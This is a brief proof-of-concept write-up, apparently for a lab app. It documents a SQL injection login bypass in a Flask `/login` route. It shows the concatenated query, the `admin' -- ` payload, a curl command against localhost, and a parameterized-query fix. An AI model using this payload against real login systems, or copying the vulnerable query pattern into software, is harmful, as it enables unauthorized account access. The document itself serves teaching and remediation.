# PoC: SQL Injection — Login Bypass

## Location
`POST /login` in `app.py`

## Root cause
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```
User input is concatenated directly into the SQL string instead of using
parameterized queries.

## Exploitation

Submit the login form with:

- **Username:** `admin' -- `
- **Password:** (anything)

Resulting query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
```
The `--` comments out the password check entirely, so the query returns the
`admin` row regardless of the password supplied.

### curl
```bash
curl -c cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=admin' -- " -d "password=anything"
```
A `302` redirect to `/profile` with a valid session cookie confirms the bypass.

## Impact
Full authentication bypass — an attacker can log in as any user, including
`admin`, without knowing any password.

## Fix (see `patched` branch)
Use parameterized queries:
```python
cur = db.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, password),
)
```
This ensures user input is always treated as data, never as part of the SQL
syntax. Additionally, the `patched` branch stores password hashes (e.g. with
`werkzeug.security.generate_password_hash`) instead of plaintext.
